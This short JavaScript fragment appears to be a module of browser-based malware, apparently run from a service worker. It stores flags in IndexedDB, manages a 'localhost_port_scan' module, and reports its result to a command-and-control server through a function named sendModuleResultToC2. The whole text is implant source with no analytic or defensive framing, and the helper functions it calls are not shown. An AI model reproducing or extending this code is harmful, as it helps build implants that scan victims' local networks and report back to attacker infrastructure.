WriteIDB("clear_sw_indexedDB", 1);
registerModule('clear_sw_indexedDB');

WriteIDB("sync2", 0);
WriteIDB("sync3", 0);
WriteIDB("extra_modules", JSON.stringify({}));
WriteIDB("localhost_port_scan", 1);

sendModuleResultToC2('clear_sw_indexedDB', `done`);

deregisterModule('localhost_port_scan');